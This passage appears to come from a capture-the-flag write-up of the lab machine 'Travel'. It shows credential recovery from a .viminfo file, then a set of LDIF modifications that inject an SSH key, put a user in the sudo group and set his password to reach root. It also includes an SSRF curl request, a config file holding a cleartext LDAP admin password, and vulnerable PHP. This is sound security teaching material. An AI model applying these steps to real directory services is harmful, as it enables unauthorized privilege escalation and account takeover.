+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lynik-admin@travel:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">dc6e97c8************************
+</span></code></pre></div></div>
+<h2 id="shell-as-roottravel">Shell as root@travel</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<h4 id="general">General</h4>
+<p>Looking around the box, the first thing I noticed was an interesting directory in the system root. In addition to <code class="language-plaintext highlighter-rouge">/home</code>, there was <code class="language-plaintext highlighter-rouge">/home@TRAVEL</code>. It was empty.</p>
+<p>Looking further, there were two things in lynik-admin’s home directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lynik-admin@travel:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 40
+drwx------ 3 lynik-admin lynik-admin 4096 May 22 20:21 .
+drwxr-xr-x 4 root        root        4096 Apr 23 17:31 ..
+lrwxrwxrwx 1 lynik-admin lynik-admin    9 Apr 23 17:31 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 lynik-admin lynik-admin  220 Feb 25 12:03 .bash_logout
+-rw-r--r-- 1 lynik-admin lynik-admin 3771 Feb 25 12:03 .bashrc
+drwx------ 2 lynik-admin lynik-admin 4096 Apr 23 19:34 .cache
+-rw-r--r-- 1 lynik-admin lynik-admin   82 Apr 23 19:35 .ldaprc
+-rw------- 1 lynik-admin lynik-admin   36 May 22 20:05 .lesshst
+-rw-r--r-- 1 lynik-admin lynik-admin  807 Feb 25 12:03 .profile
+-r--r--r-- 1 root        root          33 May 22 13:49 user.txt
+-rw------- 1 lynik-admin lynik-admin  861 Apr 23 19:35 .viminfo
+</span></code></pre></div></div>
+<p>First, there’s a <code class="language-plaintext highlighter-rouge">.ldaprc</code> file. This is a file that defines how a user connects to LDAP:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HOST ldap.travel.htb
+BASE dc=travel,dc=htb
+BINDDN cn=lynik-admin,dc=travel,dc=htb
+</code></pre></div></div>
+<p>Next, there’s a <code class="language-plaintext highlighter-rouge">.viminfo</code> file. This file is often on machines, and it’s a good idea to check what’s in there, as <code class="language-plaintext highlighter-rouge">vim</code> will often store stuff that was deleted from a file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># This viminfo file was generated by Vim 8.1.
+# You may edit it if you're careful!
+
+# Viminfo version
+|1,4
+
+# Value of 'encoding' when this file was written
+*encoding=utf-8
+
+
+# hlsearch on (H) or off (h):
+~h
+# Command Line History (newest to oldest):
+:wq!
+|2,0,1587670530,,"wq!"
+
+# Search String History (newest to oldest):
+
+# Expression History (newest to oldest):
+
+# Input Line History (newest to oldest):
+
+# Debug Line History (newest to oldest):
+
+# Registers:
+""1     LINE    0
+        BINDPW Theroadlesstraveled
+|3,1,1,1,1,0,1587670528,"BINDPW Theroadlesstraveled"
+
+# File marks:
+'0  3  0  ~/.ldaprc
+|4,48,3,0,1587670530,"~/.ldaprc"
+
+# Jumplist (newest first):
+-'  3  0  ~/.ldaprc
+|4,39,3,0,1587670530,"~/.ldaprc"
+-'  1  0  ~/.ldaprc
+|4,39,1,0,1587670527,"~/.ldaprc"
+
+# History of marks within files (newest to oldest):
+
+&gt; ~/.ldaprc
+        *       1587670529    0
+        "       3       0
+        .       4       0
+        +       4       0
+</code></pre></div></div>
+<p>This one does just that. There’s a <code class="language-plaintext highlighter-rouge">BINDPW</code>, “Theroadlesstraveled”. That’s no longer in the <code class="language-plaintext highlighter-rouge">.ldaprc</code> file, so it must have been removed.</p>
+<h4 id="ldap-enumeration">LDAP Enumeration</h4>
+<p>I can use this information to connect to the LDAP and dump information. There’s a ton, so I’ll just put portions here:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># extended LDIF
+#
+# LDAPv3
+# base &lt;dc=travel,dc=htb&gt; (default) with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# travel.htb
+dn: dc=travel,dc=htb
+objectClass: top
+objectClass: dcObject
+objectClass: organization
+o: Travel.HTB
+dc: travel
+
+# admin, travel.htb
+dn: cn=admin,dc=travel,dc=htb
+objectClass: simpleSecurityObject
+objectClass: organizationalRole
+cn: admin
+description: LDAP administrator
+
+# servers, travel.htb
+dn: ou=servers,dc=travel,dc=htb
+description: Servers
+objectClass: organizationalUnit
+ou: servers
+
+# lynik-admin, travel.htb
+dn: cn=lynik-admin,dc=travel,dc=htb
+description: LDAP administrator
+objectClass: simpleSecurityObject
+objectClass: organizationalRole
+cn: lynik-admin
+userPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ==
+
+# workstations, travel.htb
+dn: ou=workstations,dc=travel,dc=htb
+description: Workstations
+objectClass: organizationalUnit
+ou: workstations
+
+...[snip]...
+</code></pre></div></div>
+<p>So what’s interesting in here? First, I see my current user:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># lynik-admin, travel.htb
+dn: cn=lynik-admin,dc=travel,dc=htb
+description: LDAP administrator
+objectClass: simpleSecurityObject
+objectClass: organizationalRole
+cn: lynik-admin
+userPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ==
+</code></pre></div></div>
+<p>lynik-admin is the LDAP administrator. That’s interesting. The <code class="language-plaintext highlighter-rouge">userPassword</code> field is not helpful, just a hash.</p>
+<p>I see a handful of other users, that more or less look the same:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># christopher, users, linux, servers, travel.htb
+dn: uid=christopher,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: christopher
+uidNumber: 5003
+homeDirectory: /home/christopher
+givenName: Christopher
+gidNumber: 5000
+sn: Ward
+cn: Christopher Ward
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+loginShell: /bin/bash
+</code></pre></div></div>
+<h4 id="sshd-configuration">SSHd Configuration</h4>
+<p>If I look at the <code class="language-plaintext highlighter-rouge">sshd_config</code> file (<code class="language-plaintext highlighter-rouge">grep</code> to just get uncommented lines), I see something important:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lynik-admin@travel:~$</span><span class="w"> </span><span class="nb">cat</span> /etc/ssh/sshd_config | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'^#'</span> | <span class="nb">grep</span> <span class="nb">.</span> 
+<span class="go">Include /etc/ssh/sshd_config.d/*.conf
+AuthorizedKeysCommand /usr/bin/sss_ssh_authorizedkeys
+AuthorizedKeysCommandUser nobody
+ChallengeResponseAuthentication no
+UsePAM yes
+X11Forwarding yes
+PrintMotd no
+AcceptEnv LANG LC_*
+Subsystem sftp  /usr/lib/openssh/sftp-server
+PasswordAuthentication no
+Match User trvl-admin,lynik-admin
+        PasswordAuthentication yes
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">AuthorizedKeysCommand</code> is something I dealt with in <a href="/2019/02/09/htb-ypuffy.html#enumerating-the-ca">Ypuffy</a>. This is a command that’s run to get a public key for a user when the public key is provided by some service rather than in a file on the local host.</p>
+<p>I can run it now, but it fails to get a key for any user:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lynik-admin@travel:~$</span><span class="w"> </span>/usr/bin/sss_ssh_authorizedkeys jane
+</code></pre></div></div>
+<p>The config also bans password authentication for everyone but trvl-admin and lynik-admin.</p>
+<h3 id="modify-user">Modify User</h3>
+<p>I’m going to pick a user from the list in LDAP to mess with. First, I’m going to add an SSH key to their profile. To do this, I’ll need to create a LDIF file. It’s very finicky about the format, and I used a ton of different references (<a href="https://www.digitalocean.com/community/tutorials/how-to-use-ldif-files-to-make-changes-to-an-openldap-system">1</a> <a href="https://simp.readthedocs.io/en/master/user_guide/User_Management/LDAP.html">2</a> <a href="https://www.openldap.org/lists/openldap-software/200408/msg00358.html">3</a> <a href="http://pig.made-it.com/ldap-openssh.html">4</a>) and a lot of trial and error to get this working.</p>
+<p>One other thing to note - there’s something cleaning up the LDAP modifications I made very regularly, so if I change something, go research, and then come back, I may need to redo that first thing as well.</p>
+<h4 id="add-public-key">Add Public Key</h4>
+<p>I’ll create a file to add a key I made to johnny and save it as <code class="language-plaintext highlighter-rouge">/dev/shm/add_ssh_to_johnny.ldif</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dn: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+changeType: modify
+add: objectClass
+objectClass: ldapPublicKey
+-
+add: sshPublicKey
+sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDuvHabP2Cb9+Y+psec9TVEpcFufsrx+E+mcpIhFgRyAcoEMU7gmeFxonOcANJ/DCNgv3FJEYMETfdvqW3AU8vJDPFpBkzywCMCVdn8xFAQZBt2FgdVwhTA1F05bjyx+CKh8aw6iuVJhVJ3TtbcEoGsWVXfXS1nWO+uSFIDTZNNUURZRyORJdQ7JH0wwKX42htJkyIeT+Rf+OOFbOcfkfmFbNoOVvk+zm5GZxZgiAyHTeTX8xT5i16Skm4VRCLy4tmDB7Ze80egJxbQHfjRKuFOHitbz2ls6KoYWWCsugbiADjizmYlrIGqlpadenNZhL3W+HVac9CvTuDj6lxLnswpzGVj/D69DGxq0zo9ZIa9iLK9zjkyWHWxVOPuvPAxTSFrcDStPrgws95IzVTlM5ogOp0LZodGsp7hr/+03mrIBf/UIYcPgyO5Mqbo2jvtklo9ZyI2kpu+5D7FFS7YRbvLYOYvpRyGHUfpnUSEtKLRCg0ofcsoKYYPJqzrilFcPK8= root@kali
+</code></pre></div></div>
+<p>Now I’ll use <code class="language-plaintext highlighter-rouge">ldapadd</code> to push the change:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lynik-admin@travel:~$</span><span class="w"> </span>ldapadd <span class="nt">-D</span> <span class="s2">"cn=lynik-admin,dc=travel,dc=htb"</span> <span class="nt">-w</span> Theroadlesstraveled <span class="nt">-f</span> /dev/shm/add_ssh_to_johnny.ldif 
+<span class="go">modifying entry "uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb"
+</span></code></pre></div></div>
+<p>Now I can see that the key comes back:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lynik-admin@travel:~$</span><span class="w"> </span>/usr/bin/sss_ssh_authorizedkeys johnny
+<span class="go">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDuvHabP2Cb9+Y+psec9TVEpcFufsrx+E+mcpIhFgRyAcoEMU7gmeFxonOcANJ/DCNgv3FJEYMETfdvqW3AU8vJDPFpBkzywCMCVdn8xFAQZBt2FgdVwhTA1F05bjyx+CKh8aw6iuVJhVJ3TtbcEoGsWVXfXS1nWO+uSFIDTZNNUURZRyORJdQ7JH0wwKX42htJkyIeT+Rf+OOFbOcfkfmFbNoOVvk+zm5GZxZgiAyHTeTX8xT5i16Skm4VRCLy4tmDB7Ze80egJxbQHfjRKuFOHitbz2ls6KoYWWCsugbiADjizmYlrIGqlpadenNZhL3W+HVac9CvTuDj6lxLnswpzGVj/D69DGxq0zo9ZIa9iLK9zjkyWHWxVOPuvPAxTSFrcDStPrgws95IzVTlM5ogOp0LZodGsp7hr/+03mrIBf/UIYcPgyO5Mqbo2jvtklo9ZyI2kpu+5D7FFS7YRbvLYOYvpRyGHUfpnUSEtKLRCg0ofcsoKYYPJqzrilFcPK8= root@kali
+</span></code></pre></div></div>
+<p>I can also connect using the private side of that key:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/gen johnny@10.10.10.189
+<span class="go">Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)
+
+  System information as of Fri 22 May 2020 08:29:15 PM UTC
+
+  System load:                      0.01
+  Usage of /:                       46.0% of 15.68GB
+  Memory usage:                     14%
+  Swap usage:                       0%
+  Processes:                        209
+  Users logged in:                  1
+  IPv4 address for br-836575a2ebbb: 172.20.0.1
+  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.10.189
+
+Last login: Fri May 22 20:21:39 2020 from 10.10.14.47
+</span><span class="gp">johnny@travel:~$</span><span class="w">
+</span></code></pre></div></div>
+<p>johnny’s home directory is <code class="language-plaintext highlighter-rouge">/home@TRAVEL/johnny</code>.</p>
+<h4 id="change-group">Change Group</h4>
+<p>Having a shell as johnny doesn’t gain me much in the current status. But, there are other things I can change over remote LDAP, like the user’s group. I first tried to change it to 0, or root, but that didn’t take (I’ll show that config in <a href="#sssd">Beyond Root</a>). But then I realized there’s a group just as good - <code class="language-plaintext highlighter-rouge">sudo</code>. I looked in <code class="language-plaintext highlighter-rouge">/etc/group</code> to see it’s gid 27:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lynik-admin@travel:~$</span><span class="w"> </span><span class="nb">grep sudo</span> /etc/group 
+<span class="go">sudo:x:27:trvl-admin
+</span></code></pre></div></div>
+<p>Then I created <code class="language-plaintext highlighter-rouge">change_johnny_to_sudo.ldif</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dn: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+changeType: modify
+replace: gidNumber
+gidNumber: 27
+</code></pre></div></div>
+<p>Before I add this to LDAP, I can use <code class="language-plaintext highlighter-rouge">getent passwd</code> to see the LDAP version of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file. I’ll just grep on johnny for example:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lynik-admin@travel:~$</span><span class="w"> </span>getent passwd | <span class="nb">grep </span>johnny
+<span class="go">johnny:*:5004:5000:Johnny Miller:/home@TRAVEL/johnny:/bin/bash 
+</span></code></pre></div></div>
+<p>Now I’ll run the <code class="language-plaintext highlighter-rouge">.ldif</code> with <code class="language-plaintext highlighter-rouge">ldapadd</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lynik-admin@travel:~$</span><span class="w"> </span>ldapadd <span class="nt">-D</span> <span class="s2">"cn=lynik-admin,dc=travel,dc=htb"</span> <span class="nt">-w</span> Theroadlesstraveled <span class="nt">-f</span> /dev/shm/change_johnny_to_sudo.ldif       
+<span class="go">modifying entry "uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb"
+</span></code></pre></div></div>
+<p>If I check the passwd again, now johnny is group 27:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lynik-admin@travel:~$</span><span class="w"> </span>getent passwd | <span class="nb">grep </span>johnny
+<span class="go">johnny:*:5004:27:Johnny Miller:/home@TRAVEL/johnny:/bin/bash
+</span></code></pre></div></div>
+<p>I can SSH to the box, and the group is there:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/gen johnny@10.10.10.189
+<span class="go">Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)
+
+  System information as of Fri 22 May 2020 09:09:05 PM UTC
+
+  System load:                      0.02
+  Usage of /:                       46.0% of 15.68GB
+  Memory usage:                     14%
+  Swap usage:                       0%
+  Processes:                        204
+  Users logged in:                  2
+  IPv4 address for br-836575a2ebbb: 172.20.0.1
+  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.10.189
+
+Last login: Fri May 22 20:35:39 2020 from 10.10.14.47
+</span><span class="gp">johnny@travel:~$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=5004(johnny) gid=27(sudo) groups=27(sudo),5000(domainusers)
+</span></code></pre></div></div>
+<p>But when I run <code class="language-plaintext highlighter-rouge">sudo</code>, it asks for a password, which I don’t know:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">johnny@travel:~$</span><span class="w"> </span><span class="nb">sudo </span>su -
+<span class="go">[sudo] password for johnny:
+</span></code></pre></div></div>
+<h4 id="add-password">Add Password</h4>
+<p>One last LDAP mod - add a password for johnny. Another <code class="language-plaintext highlighter-rouge">.ldif</code> file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dn: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+changeType: modify
+replace: userPassword
+userPassword: 0xdf
+</code></pre></div></div>
+<p>Run it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lynik-admin@travel:~$</span><span class="w"> </span>ldapadd <span class="nt">-D</span> <span class="s2">"cn=lynik-admin,dc=travel,dc=htb"</span> <span class="nt">-w</span> Theroadlesstraveled <span class="nt">-f</span> /dev/shm/add_johnny_pass.ldif 
+<span class="go">modifying entry "uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb"
+</span></code></pre></div></div>
+<p>Wait a few seconds for it to add to the system, and then SSH in, <code class="language-plaintext highlighter-rouge">sudo</code>, and I’m root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/gen johnny@10.10.10.189
+<span class="go">Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)
+
+  System information as of Fri 22 May 2020 09:11:33 PM UTC
+
+  System load:                      0.0
+  Usage of /:                       46.0% of 15.68GB
+  Memory usage:                     14%
+  Swap usage:                       0%
+  Processes:                        215
+  Users logged in:                  2
+  IPv4 address for br-836575a2ebbb: 172.20.0.1
+  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.10.189
+
+Last login: Fri May 22 21:09:05 2020 from 10.10.14.47
+johnny@travel:~$ sudo su -
+[sudo] password for johnny: 
+</span><span class="gp">root@travel:~#</span><span class="w">
+</span></code></pre></div></div>
+<p>And grab <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@travel:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">c8c6f05f************************
+</span></code></pre></div></div>
+<h4 id="all-in-one">All in One</h4>
+<p>I did figure out how to get all three changes into on <code class="language-plaintext highlighter-rouge">.ldif</code> file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dn: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+changeType: modify
+replace: gidNumber
+gidNumber: 27
+-
+replace: userPassword
+userPassword: 0xdf
+-
+add: objectClass
+objectClass: ldapPublicKey
+-
+add: sshPublicKey
+sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDuvHabP2Cb9+Y+psec9TVEpcFufsrx+E+mcpIhFgRyAcoEMU7gmeFxonOcANJ/DCNgv3FJEYMETfdvqW3AU8vJDPFpBkzywCMCVdn8xFAQZBt2FgdVwhTA1F05bjyx+CKh8aw6iuVJhVJ3TtbcEoGsWVXfXS1nWO+uSFIDTZNNUURZRyORJdQ7JH0wwKX42htJkyIeT+Rf+OOFbOcfkfmFbNoOVvk+zm5GZxZgiAyHTeTX8xT5i16Skm4VRCLy4tmDB7Ze80egJxbQHfjRKuFOHitbz2ls6KoYWWCsugbiADjizmYlrIGqlpadenNZhL3W+HVac9CvTuDj6lxLnswpzGVj/D69DGxq0zo9ZIa9iLK9zjkyWHWxVOPuvPAxTSFrcDStPrgws95IzVTlM5ogOp0LZodGsp7hr/+03mrIBf/UIYcPgyO5Mqbo2jvtklo9ZyI2kpu+5D7FFS7YRbvLYOYvpRyGHUfpnUSEtKLRCg0ofcsoKYYPJqzrilFcPK8= root@kali
+</code></pre></div></div>
+<p>Also, instead of <code class="language-plaintext highlighter-rouge">sudo</code>, I could have done <code class="language-plaintext highlighter-rouge">docker</code> or <code class="language-plaintext highlighter-rouge">disk</code> (or probably other groups) as well.</p>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="rss-exploration">RSS Exploration</h3>
+<p>I noticed something weird when I was playing with the RSS feed at the beginning. When I would hit the rss feed with one <code class="language-plaintext highlighter-rouge">curl</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="s1">'http://blog.travel.htb/awesome-rss/?debug&amp;custom_feed_url&amp;url=http://10.10.14.47/customfeed.xml'</span> <span class="o">&gt;</span> /dev/null
+</code></pre></div></div>
+<p>It would try twice to get the feed:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.189 - - [20/May/2020 16:47:29] "GET /customfeed.xml HTTP/1.1" 200 -
+10.10.10.189 - - [20/May/2020 16:47:29] "GET /customfeed.xml HTTP/1.1" 200 -
+</code></pre></div></div>
+<p>In the <code class="language-plaintext highlighter-rouge">init()</code> <a href="https://github.com/WordPress/WordPress/blob/master/wp-includes/class-simplepie.php#L1393">function for SimplePie</a>, it first checks if there’s no url or raw data, in which case it returns false. Then, if there’s a url, it tries to fetch the data:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">feed_url</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$parsed_feed_url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">registry</span><span class="o">-&gt;</span><span class="nf">call</span><span class="p">(</span><span class="s1">'Misc'</span><span class="p">,</span> <span class="s1">'parse_url'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">feed_url</span><span class="p">));</span>
+
+    <span class="c1">// Decide whether to enable caching</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cache</span> <span class="o">&amp;&amp;</span> <span class="nv">$parsed_feed_url</span><span class="p">[</span><span class="s1">'scheme'</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">''</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">feed_url</span> <span class="mf">.</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">force_feed</span> <span class="o">?</span> <span class="s1">'#force_feed'</span> <span class="o">:</span> <span class="s1">''</span><span class="p">);</span>
+        <span class="nv">$cache</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">registry</span><span class="o">-&gt;</span><span class="nf">call</span><span class="p">(</span><span class="s1">'Cache'</span><span class="p">,</span> <span class="s1">'get_handler'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cache_location</span><span class="p">,</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cache_name_function</span><span class="p">,</span> <span class="nv">$url</span><span class="p">),</span> <span class="s1">'spc'</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Fetch the data via SimplePie_File into $this-&gt;raw_data</span>
+    <span class="k">if</span> <span class="p">((</span><span class="nv">$fetched</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">fetch_data</span><span class="p">(</span><span class="nv">$cache</span><span class="p">))</span> <span class="o">===</span> <span class="kc">true</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$fetched</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">list</span><span class="p">(</span><span class="nv">$headers</span><span class="p">,</span> <span class="nv">$sniffed</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$fetched</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>So only if there’s data and no url would it continue without making the request. I guess that’s why in the code this line is commented out:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//$simplepie-&gt;set_raw_data($data);</span>
+</code></pre></div></div>
+<p>The PHP would have to not set the url and set this data to make it work. But then the caching would be weird. Or they could have just let SimplePie make the request, but I suspect it’s not vulnerable to the SSRF I needed to poison memcache.</p>
+<h3 id="sssd">sssd</h3>
+<p>I was curious why I couldn’t use LDAP to add a user to the root group, or change the ssh key for the root user. It turns out that it’s blocked in the config, <code class="language-plaintext highlighter-rouge">/etc/sssd/sssd.conf</code>, in the second section, <code class="language-plaintext highlighter-rouge">nss</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@travel:/etc/sssd#</span><span class="w"> </span><span class="nb">cat </span>sssd.conf 
+<span class="go">[sssd]
+config_file_version = 2
+</span><span class="c">#services = nss,pam,ssh
+</span><span class="go">domains = TRAVEL
+
+[nss]
+filter_users = root
+filter_groups = root
+enum_cache_timeout = 1
+memcache_timeout = 0
+
+[pam]
+
+[domain/TRAVEL]
+use_fully_qualified_names = False
+override_homedir = /home@TRAVEL/%u
+enumerate = True
+ignore_group_members = False
+id_provider = ldap
+auth_provider = ldap
+ldap_uri = ldap://ldap.travel.htb
+cache_credentials = False
+ldap_enumeration_refresh_timeout = 3
+ldap_id_use_start_tls = true
+ldap_tls_reqcert = allow
+ldap_default_bind_dn = cn=admin,dc=travel,dc=htb
+ldap_default_authtok = yooxoL8eVoagheich5ug0ne1Oy1Wai
+ldap_search_base = ou=linux,ou=servers,dc=travel,dc=htb
+ldap_user_search_base = ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+ldap_group_search_base = ou=groups,ou=linux,ou=servers,dc=travel,dc=htb
+</span></code></pre></div></div>
+<h2 id="full-php-code">Full PHP Code</h2>
+<p><code class="language-plaintext highlighter-rouge">rss_template.php</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="cm">/*
+Template Name: Awesome RSS
+*/</span>
+<span class="k">include</span><span class="p">(</span><span class="s1">'template.php'</span><span class="p">);</span>
+<span class="nf">get_header</span><span class="p">();</span>
+<span class="cp">?&gt;</span>
+
+<span class="nt">&lt;main</span> <span class="na">class=</span><span class="s">"section-inner"</span><span class="nt">&gt;</span>
+    <span class="cp">&lt;?php</span>
+    <span class="k">function</span> <span class="n">get_feed</span><span class="p">(</span><span class="nv">$url</span><span class="p">){</span>
+     <span class="k">require_once</span> <span class="no">ABSPATH</span> <span class="mf">.</span> <span class="s1">'/wp-includes/class-simplepie.php'</span><span class="p">;</span>
+     <span class="nv">$simplepie</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+     <span class="nv">$data</span> <span class="o">=</span> <span class="nf">url_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+     <span class="k">if</span> <span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
+         <span class="nv">$simplepie</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SimplePie</span><span class="p">();</span>
+         <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">set_cache_location</span><span class="p">(</span><span class="s1">'memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_'</span><span class="p">);</span>
+         <span class="c1">//$simplepie-&gt;set_raw_data($data);</span>
+         <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">set_feed_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+         <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">();</span>
+         <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">handle_content_type</span><span class="p">();</span>
+         <span class="k">if</span> <span class="p">(</span><span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
+             <span class="nb">error_log</span><span class="p">(</span><span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="n">error</span><span class="p">);</span>
+             <span class="nv">$simplepie</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+             <span class="nv">$failed</span> <span class="o">=</span> <span class="kc">True</span><span class="p">;</span>
+         <span class="p">}</span>
+     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+         <span class="nv">$failed</span> <span class="o">=</span> <span class="kc">True</span><span class="p">;</span>
+     <span class="p">}</span>
+     <span class="k">return</span> <span class="nv">$simplepie</span><span class="p">;</span>
+     <span class="p">}</span>
+
+    <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">];</span>
